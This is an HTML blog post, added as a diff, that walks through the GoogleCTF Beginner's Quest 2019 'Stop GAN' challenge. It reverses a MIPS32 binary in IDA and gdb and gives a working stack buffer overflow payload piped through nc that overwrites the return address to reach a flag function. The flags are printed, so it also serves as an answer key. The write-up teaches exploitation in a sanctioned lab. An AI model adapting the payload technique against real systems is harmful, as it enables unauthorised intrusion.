@@ -1,0 +1,461 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+    <meta name="generator" content="Hugo 0.65.0" />
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://shiny-labs.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://shiny-labs.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://shiny-labs.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://shiny-labs.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://shiny-labs.github.io/safari-pinned-tab.svg" color="#000000">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="theme-color" content="#ffffff">
+
+
+    <link rel="stylesheet" href="https://shiny-labs.github.io/css/bulma.min.css">
+    <link rel="stylesheet" href="https://shiny-labs.github.io/css/main.css">
+    <link rel="stylesheet" href="https://shiny-labs.github.io/css/syntax.css">
+
+    
+    <title>shiny-labs || GoogleCTF Beginner&#39;s Quest 2019 - Stop GAN</title>
+</head>
+<body><nav class="navbar" role="navigation" aria-label="main navigation">
+    <div class="navbar-brand">
+        <a class="navbar-item no-squiggly" href="https://shiny-labs.github.io/">
+            <h1 id="logo" class="glitch">shiny-labs</h1>
+        </a>
+    </div>
+
+    <div class="navbar-menu">
+        <div class="navbar-start">
+            
+        </div>
+
+        <div class="navbar-end">
+            
+            <h3 id="subtitle">Exploit, reverse engineering and cats.</h3>
+        </div>
+    </div>
+</nav>
+
+<div id="content">
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="menu-column"><div id="menu" class="tabs is-centered is-medium">
+    <ul>
+            <li><a href="https://shiny-labs.github.io/" class="no-squiggly">Home</a></li>
+            <li><a href="https://shiny-labs.github.io/posts/" class="no-squiggly">Posts</a></li>
+            <li><a href="https://shiny-labs.github.io/tags/" class="no-squiggly">Tags</a></li>
+            <li><a href="https://shiny-labs.github.io/about/" class="no-squiggly">About</a></li>
+            <li><a href="https://shiny-labs.github.io/archives/" class="no-squiggly">Archives</a></li>
+  </ul>
+</div>
+</div>
+            </div>
+
+            <div class="columns is-centered">
+                <div class="column is-10" id="main-column">
+<div class="columns">
+<div class="column is-10" id="main-column">
+    <article class="article">
+        <div >
+            <h1 class="article-title">GoogleCTF Beginner&#39;s Quest 2019 - Stop GAN</h1>
+            
+<div class="post-meta">
+  <p class="article-meta">
+  <span>Date</span> &#x5b;
+  <time datetime="August 13, 2019">
+      Aug 13
+    </time>
+  &#x5d;
+        
+        
+  <span>Categories</span> &#x5b;
+    <a href="https://shiny-labs.github.io/categories"></a>
+  &#x5d;
+        
+        
+  <span>Series</span> &#x5b;
+    <a href="https://shiny-labs.github.io/series/googlectf-beginners-quest-2019">GoogleCTF Beginner&#39;s Quest 2019</a>
+  &#x5d;
+        
+        
+  <span>Tags</span> &#x5b;
+    <a href="https://shiny-labs.github.io/tags/pwn">pwn</a>
+    <a href="https://shiny-labs.github.io/tags/mips32">mips32</a>
+  &#x5d;
+  </p>
+</div>
+
+        </div>
+        <div>
+            <h2 id="description">Description</h2>
+<blockquote>
+<p>Success, you&rsquo;ve gotten the picture of your lost love, not knowing that pictures and the things you take pictures of are generally two separate things, you think you&rsquo;ve rescue them and their brethren by downloading them all to your ships hard drive. They&rsquo;re still being eaten, but this is a fact that has escaped you entirely. Your thoughts swiftly shift to revenge. It&rsquo;s important now to stop this program from destroying these &ldquo;Cauliflowers&rdquo; as they&rsquo;re referred to, ever again.</p>
+<p>buffer-overflow.ctfcompetition.com 1337</p>
+</blockquote>
+<h2 id="solving">Solving</h2>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">ll
+Permissions Size User  Group Date Modified Name
+.rw-r--r--  678k kylma users  <span class="m">6</span> Aug 16:25  4a8becb637ed2b45e247d482ea9df123eb01115fc33583c2fa0e4a69b760af4a.zip    .rw-r--r--  1.1k kylma users <span class="m">31</span> Dec  <span class="m">1979</span>  console.c
+.rwxr-xr-x  677k kylma users <span class="m">31</span> Dec  <span class="m">1979</span>  bof
+</code></pre></div><p>We&rsquo;ve got two files, hopefully, the source code and the binary.</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ chmod +x bof
+$ ./bof
+zsh: <span class="nb">exec</span> format error: ./bof
+</code></pre></div><p>Uh?! I smell troubles!</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">file bof
+bof: ELF 32-bit LSB executable, MIPS, MIPS32 rel2 version <span class="m">1</span> <span class="o">(</span>SYSV<span class="o">)</span>, statically linked, <span class="k">for</span> GNU/Linux 3.2.0, BuildID<span class="o">[</span>sha1<span class="o">]=</span>a31c48679f10dc6945e7b5e3a88b979bebe752e3, not stripped
+</code></pre></div><p>Troubles indeed! It&rsquo;s a MIPS32 binary, it won&rsquo;t run on my machine&hellip;</p>
+<h3 id="console">console</h3>
+<div class="highlight"><pre class="chroma"><code class="language-python" data-lang="python"><span class="c1">#include &lt;stdio.h&gt;</span>
+<span class="c1">#include &lt;stdlib.h&gt;</span>
+<span class="c1">#include &lt;string.h&gt;</span>
+<span class="c1">#include &lt;unistd.h&gt;</span>
+
+<span class="o">/**</span>
+ <span class="o">*</span> <span class="mi">6</span><span class="n">e</span><span class="p">:</span> <span class="n">bufferflow</span> <span class="n">triggering</span> <span class="n">segfault</span>  <span class="o">-</span> <span class="n">binary</span><span class="p">,</span> <span class="nb">compile</span> <span class="k">with</span><span class="p">:</span>
+ <span class="o">*</span> <span class="n">gcc</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">console</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">console</span> <span class="o">-</span><span class="n">static</span> <span class="o">-</span><span class="n">s</span>
+ <span class="o">*</span>
+ <span class="o">*</span> <span class="n">Console</span> <span class="n">allows</span> <span class="n">the</span> <span class="n">player</span> <span class="n">to</span> <span class="n">get</span> <span class="n">info</span> <span class="n">on</span> <span class="n">the</span> <span class="n">binary</span><span class="o">.</span>
+ <span class="o">*</span> <span class="n">Crashing</span> <span class="n">bof</span> <span class="n">will</span> <span class="n">trigger</span> <span class="n">the</span> <span class="mi">1</span><span class="n">st</span> <span class="n">flag</span><span class="o">.</span>
+ <span class="o">*</span> <span class="n">Controlling</span> <span class="n">the</span> <span class="nb">buffer</span> <span class="n">overflow</span> <span class="ow">in</span> <span class="n">bof</span> <span class="n">will</span> <span class="n">trigger</span> <span class="n">the</span> <span class="mi">2</span><span class="n">nd</span> <span class="n">flag</span><span class="o">.</span>
+ <span class="o">*/</span>
+
+<span class="nb">int</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
+  <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="n">NULL</span><span class="p">);</span>
+  <span class="n">char</span> <span class="n">inputs</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using &#39;run&#39; command.</span><span class="se">\n</span><span class="s2"> Bonus flag for controlling the crash.</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
+  <span class="k">while</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">Console commands: </span><span class="se">\n</span><span class="s2">run</span><span class="se">\n</span><span class="s2">quit</span><span class="se">\n</span><span class="s2">&gt;&gt;&#34;</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">inputs</span><span class="p">,</span> <span class="mi">256</span><span class="p">,</span> <span class="n">stdin</span><span class="p">)</span> <span class="o">==</span> <span class="n">NULL</span><span class="p">)</span> <span class="p">{</span>
+      <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="n">printf</span><span class="p">(</span><span class="s2">&#34;Inputs: </span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">inputs</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">inputs</span><span class="p">,</span> <span class="s2">&#34;run</span><span class="se">\n\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="nb">int</span> <span class="n">result</span> <span class="o">=</span> <span class="n">system</span><span class="p">(</span><span class="s2">&#34;/usr/bin/qemu-mipsel-static ./bof&#34;</span><span class="p">);</span>
+      <span class="k">continue</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">inputs</span><span class="p">,</span> <span class="s2">&#34;quit</span><span class="se">\n\0</span><span class="s2">&#34;</span><span class="p">,</span> <span class="mi">256</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span> <span class="p">)</span> <span class="p">{</span>
+      <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="n">puts</span><span class="p">(</span><span class="s2">&#34;Unable to determine action from your input&#34;</span><span class="p">);</span>
+      <span class="nb">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>console is just a wrapper which greets when connecting on <code>buffer-overflow.ctfcompetition.com 1337</code> :</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nc buffer-overflow.ctfcompetition.com <span class="m">1337</span>
+Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using <span class="s1">&#39;run&#39;</span> command.
+ Bonus flag <span class="k">for</span> controlling the crash.
+
+Console commands:
+run
+quit
+&gt;&gt;run
+Inputs: run
+myfancyinput
+Cauliflower systems never crash &gt;&gt;
+
+Console commands:
+run
+quit
+&gt;&gt;quit
+Inputs: quit
+
+</code></pre></div><p>What did we learn so far:</p>
+<ul>
+<li>the  <code>run</code> command forwards the input to bof</li>
+<li><code>6e: bufferflow triggering segfault</code> &ndash;&gt; it&rsquo;s definitely a buffer overflow attack</li>
+<li>uhuh, two flags eh? An easy one for crashing and a second one for doing something useful with that crash.</li>
+</ul>
+<h3 id="bof">bof</h3>
+<p>Since we can&rsquo;t run it, let&rsquo;s open it in IDA!</p>
+<p><img src="0_ida_main.png" alt=""></p>
+<p>Lots of functions are identified and automatically named, which is a good thing! The <code>main()</code> function is the main logic of the program:</p>
+<ol>
+<li>It prints <code>Cauliflower systems never crash &gt;&gt;</code> using the <code>puts()</code> function.</li>
+<li>It uses <code>scanf()</code> to retrieve the user input.</li>
+</ol>
+<p>Two functions in main are really interesting for us:</p>
+<ul>
+<li><code>write_out()</code>: detect a segfault and prints the first flag (flag0).</li>
+</ul>
+<p><img src="2_ida_write_out.png" alt=""></p>
+<ul>
+<li><code>local_file()</code>: open a file and print its content, ie the second flag (flag1).</li>
+</ul>
+<p><img src="3_ida_local_flag.png" alt=""></p>
+<h4 id="flag-0">Flag 0</h4>
+<p>The first flag requires absolutely no reverse, since we know it&rsquo;s a buffer overflow, we can just try giant strings and see if it crashes:</p>
+<p>Test:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nc buffer-overflow.ctfcompetition.com <span class="m">1337</span>
+$ python -c <span class="s2">&#34;print(&#39;run\n&#39; + &#39;A&#39; * 1024)&#34;</span> <span class="p">|</span> nc buffer-overflow.ctfcompetition.com <span class="m">1337</span>
+Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using <span class="s1">&#39;run&#39;</span> command.
+ Bonus flag <span class="k">for</span> controlling the crash.
+
+Console commands:
+run
+quit
+&gt;&gt;run
+Inputs: run
+CTF<span class="o">{</span>Why_does_cauliflower_threaten_us<span class="o">}</span>
+Cauliflower systems never crash &gt;&gt;
+segfault detected! ***CRASH***
+Console commands:
+run
+quit
+
+</code></pre></div><p>Flag: <code>CTF{Why_does_cauliflower_threaten_us}</code></p>
+<h4 id="mips32">MIPS32</h4>
+<p>At this point, I went to read a bit on the <a href="https://github.com/MIPT-ILab/mipt-mips/wiki/MIPS-Instruction-Set">mips 32 instruction set</a> to understand what I&rsquo;m reversing. This article on <a href="https://jcjc-dev.com/2016/12/14/reversing-huawei-5-reversing-firmware/">Digging Through the Firmware</a> was <em>so useful</em> (go read the whole serie, it&rsquo;s awesome!), not only is it super well explained, it has a few cool resources on MIPS reversing.</p>
+<ul>
+<li><a href="https://www.linux-mips.org/wiki/Main_Page">https://www.linux-mips.org/wiki/Main_Page</a></li>
+<li><a href="https://www.praetorian.com/blog/reversing-and-exploiting-embedded-devices-part-1-the-software-stack">https://www.praetorian.com/blog/reversing-and-exploiting-embedded-devices-part-1-the-software-stack</a></li>
+<li><a href="https://github.com/MIPT-ILab/mipt-mips/wiki/MIPS-Instruction-Set">https://github.com/MIPT-ILab/mipt-mips/wiki/MIPS-Instruction-Set</a></li>
+<li><a href="https://github.com/MIPT-ILab/mipt-mips/wiki/MIPS-registers">https://github.com/MIPT-ILab/mipt-mips/wiki/MIPS-registers</a></li>
+</ul>
+<h5 id="pseudo-instructions">Pseudo-instructions</h5>
+<p>Some instructions are actually just aliases, they end up being expanded to other instructions by the assembler.</p>
+<p>For example, the instruction for &ldquo;branch and link&rdquo;, bal <!-- raw HTML omitted --> is actually expanded to bgezal $zero, <!-- raw HTML omitted -->. See <a href="https://github.com/MIPT-ILab/mipt-mips/wiki/MIPS-pseudo-instructions">MIPS pseudo instructions</a> for a complete list.</p>
+<h5 id="delay-slots">Delay Slots</h5>
+<p>A very disturbing concept if you come from x86! The instruction <strong>immediately after</strong> a branching instructions (<code>bal</code>, <code>jalr</code> and their friends) is executed <strong>before</strong> branching.</p>
+<p>This is also the reason of that very weird pattern:</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">bal     __isoc99_scanf
+nop
+</code></pre></div><p>A <code>nop</code> is placed after the branching execution because of the delay slot.</p>
+<h5 id="registers">Registers</h5>
+<p>The <a href="https://github.com/MIPT-ILab/mipt-mips/wiki/MIPS-registers">Wiki on MIPS registers</a> describes the main registers used by MIPS. Here is a summary:</p>
+<table>
+<thead>
+<tr>
+<th>Register Name</th>
+<th>Usage</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>$zero</td>
+<td>Holds the constant 0</td>
+</tr>
+<tr>
+<td>$at</td>
+<td>assembler temporary, used when pseudo-instructions are expanded</td>
+</tr>
+<tr>
+<td>$v0, $v1</td>
+<td>function return values</td>
+</tr>
+<tr>
+<td>$a0 -&gt; $a1</td>
+<td>function args</td>
+</tr>
+<tr>
+<td>$t0 -&gt; $t9</td>
+<td>temp registers</td>
+</tr>
+<tr>
+<td>$gp</td>
+<td>global pointer, area where global vars are stored</td>
+</tr>
+<tr>
+<td>$sp</td>
+<td>stack pointer</td>
+</tr>
+<tr>
+<td>$ra</td>
+<td>return address, updated by &ldquo;jump and link&rdquo; commands like <code>jal</code>, <code>jalr</code></td>
+</tr>
+<tr>
+<td>$fp <strong>or s8</strong></td>
+<td>frame pointer</td>
+</tr>
+<tr>
+<td>badvaddr</td>
+<td>memory address at which exceptions occurs</td>
+</tr>
+</tbody>
+</table>
+<h5 id="instructions">Instructions</h5>
+<p>A couple of must-know instructions:</p>
+<table>
+<thead>
+<tr>
+<th>Instruction</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>bal</td>
+<td>branch and link, call a function and update $ra</td>
+</tr>
+<tr>
+<td>sw</td>
+<td>store word</td>
+</tr>
+<tr>
+<td>lw</td>
+<td>load word</td>
+</tr>
+<tr>
+<td>addiu</td>
+<td>add unsigned integer</td>
+</tr>
+</tbody>
+</table>
+<h4 id="flag-1">Flag 1</h4>
+<p>Back at our crash after finding flag 0, why does it crashes?</p>
+<p><img src="4_ida_flag_0.png" alt=""></p>
+<p><code>write_out</code>, the function printing flag 0, is defined as a handler for SIGSEGV. This is done through the function <code>ssignal</code>:</p>
+<blockquote>
+<p>sighandler_t ssignal(int signum, sighandler_t action);</p>
+<p>The function ssignal() defines the action to take when the software signal with number signum is raised using the  function  gsignal(),  and  returns the previous such action or SIG_DFL.</p>
+<p>&ndash; relevant part of man ssignal</p>
+</blockquote>
+<p>The numeric value of the signal, here 11, can be translated with the section &ldquo;Signal numbering for standard signals&rdquo; in <code>man 7 signal</code>. Relevant extract below:</p>
+<blockquote>
+<pre><code>   Signal        x86/ARM     Alpha/   MIPS   PARISC   Notes
+               most others   SPARC
+   SIGBUS           7          10      10      10
+   SIGEMT           -           7       7      -
+   SIGFPE           8           8       8       8
+   SIGKILL          9           9       9       9
+   SIGUSR1         10          30      16      16
+   SIGSEGV         11          11      11      11
+   SIGUSR2         12          31      17      17
+   SIGPIPE         13          13      13      13
+   SIGALRM         14          14      14      14
+</code></pre>
+</blockquote>
+<p>Then, <code>scanf()</code> is called to retrieve the user input. Using scanf() is a terrible idea, it will not check that it has enough place to store the input and just stuff it, no matter the size. If you have a buffer of length 10, <code>scanf()</code> can and will happily store 20 characters without thinking twice, and cause a buffer overflow.</p>
+<p>Double-click on <code>var_10C</code> to display the stack variables:</p>
+<p><img src="5_ida_stack_vars.png" alt=""></p>
+<p><code>var_10C</code> can be renamed <code>user_input</code> and displayed as an array of 260 bytes using right click &gt; array.</p>
+<p>A few tests made with <code> python -c &quot;print('run\n' + 'A' * 260)&quot; | nc buffer-overflow.ctfcompetition.com 1337</code></p>
+<ul>
+<li>input &lt; 264: no crash</li>
+<li>input = 264: no crash, hangs</li>
+<li>input = 265: <code>qemu: uncaught target signal 4 (Illegal instruction) - core dumped Illegal instruction (core dumped)</code></li>
+<li>input &gt;= 266: crash with the flag</li>
+</ul>
+<p><img src="6_ida_flag_1.png" alt=""></p>
+<p>The binary crashes if we overwrite the return address, ie 260+4 bytes. And to control the flow of execution, the return address can be overwritten with the address of a function we want to execute like <code>local_flag()</code>.</p>
+<p>Get the address of <code>local_flag()</code>:</p>
+<div class="highlight"><pre class="chroma"><code class="language-bash" data-lang="bash">$ nm bof <span class="p">|</span> grep local_flag
+<span class="m">00400840</span> t local_flag
+</code></pre></div><p>Okay, let&rsquo;s assemble our &ldquo;exploit&rdquo; now: 264 characters of garbage and the address of local_flag (backwards because of the endianness):</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ python -c &#34;print(&#39;run\n&#39; + &#39;A&#39; * 264 + &#39;\x40\x08\x40\x00&#39;)&#34; | nc buffer-overflow.ctfcompetition.com 1337
+ Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using &#39;run&#39; command.
+ Bonus flag for controlling the crash.
+
+Console commands:
+run
+quit
+&gt;&gt;Inputs: run
+CTF{Why_does_cauliflower_threaten_us}
+Cauliflower systems never crash &gt;&gt;
+segfault detected! ***CRASH***
+Console commands:
+run
+quit
+</code></pre></div><p>Huh. It&rsquo;s now working at all. It should trigger another flag, but instead, it&rsquo;s triggering only the flag we already had&hellip; Riiiight, let&rsquo;s get the debugger out to understand what&rsquo;s going on! The payload used is 260 As, 4 Bs and 4 Cs.</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback"># gdb -q bof
+Reading symbols from /root/bof...(no debugging symbols found)...done.
+(gdb) r
+Starting program: /root/bof
+Failed to read a valid object file image from memory.
+Cauliflower systems never crash &gt;&gt;
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBCCCC
+
+Program received signal SIGSEGV, Segmentation fault.
+0x43434342 in ?? ()
+(gdb) info r
+          zero       at       v0       v1       a0       a1       a2       a3
+ R0   00000000 00000001 00000000 00000000 004a19c8 00000081 004754f5 00000000
+            t0       t1       t2       t3       t4       t5       t6       t7
+ R8   00000000 0000000a 41414141 41414141 0002c800 0000043b 00000000 0004151d
+            s0       s1       s2       s3       s4       s5       s6       s7
+ R16  00401160 004d2524 004cc4a7 004b0000 004d254c 77fdc5b8 004d2504 00000000
+            t8       t9       k0       k1       gp       sp       s8       ra
+ R24  00000001 00417818 fbad2a84 00000000 004a8970 7fe4c580 42424242 43434343
+        status       lo       hi badvaddr    cause       pc
+      0000a713 0002c800 00000000 43434342 10800008 43434343
+          fcsr      fir  restart
+      00000000 00739300 00000000
+</code></pre></div><p>Nothing unusual here, it&rsquo;s doing what it supposed to do&hellip; I have no idea why it&rsquo;s not working.</p>
+<p>I eventually managed to get the second flag by trial-and-error, I ended up constructing a payload which jump after a few instructions of <code>local_flag()</code>ie at address: 0x0040084C instead of 0x00400840:</p>
+<p><img src="7_ida_local_flag.png" alt=""></p>
+<p>I still have no idea why these two instructions doing stuff with the global pointer were preventing me from getting the flag but well&hellip; it works&hellip;</p>
+<p><img src="confused_cat.gif" alt=""></p>
+<p>Don&rsquo;t mess with the global pointer, that&rsquo;s all I know :p</p>
+<div class="highlight"><pre class="chroma"><code class="language-fallback" data-lang="fallback">$ python -c &#34;print(&#39;run\n&#39; + &#39;A&#39; * 264 + &#39;\x4C\x08\x40\x00&#39;)&#34; | nc buffer-overflow.ctfcompetition.com 1337
+Your goal: try to crash the Cauliflower system by providing input to the program which is launched by using &#39;run&#39; command.
+ Bonus flag for controlling the crash.
+
+Console commands:
+run
+quit
+&gt;&gt;Inputs: run
+CTF{controlled_crash_causes_conditional_correspondence}
+Cauliflower systems never crash &gt;&gt;
+
+Console commands:
+run
+quit
+&gt;&gt;%
+</code></pre></div><p>Flag: <code>CTF{controlled_crash_causes_conditional_correspondence}</code></p>
+<h2 id="links">Links</h2>
+<p><a href="https://jcjc-dev.com/2016/12/14/reversing-huawei-5-reversing-firmware/">https://jcjc-dev.com/2016/12/14/reversing-huawei-5-reversing-firmware/</a></p>
+<p><a href="https://werewblog.wordpress.com/2015/11/23/a-simple-buffer-overflow-exploit-mips-architecture/">https://werewblog.wordpress.com/2015/11/23/a-simple-buffer-overflow-exploit-mips-architecture/</a></p>
+
+        </div>
+    </article>
+</div>
+<div class="column" id="toc-column">    <aside>
+        <div id="toc">
+            What's on this page?
+            <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#description">Description</a></li>
+        <li><a href="#solving">Solving</a>
+          <ul>
+            <li><a href="#console">console</a></li>
+            <li><a href="#bof">bof</a></li>
+          </ul>
+        </li>
+        <li><a href="#links">Links</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+        </div>
+    </aside>
+
+</div>
+</div></div>
+            </div><footer class="footer">
+  <div class="content has-text-centered">
+    <p>
+    Handcrafted with <span style="color: #e25555;">&hearts;</span> by kylma, with lots of
+    
+        <a href="https://shiny-labs.github.io/credits/">awesome tools</a>.
+    
+    </p>
+  </div>
+
+  <div id="to-top">
+    <a href="#logo" class="top-btn no-squiggly">^</a>
+  </div>
+
+</footer>
+</div>
+    </body>
+</html>
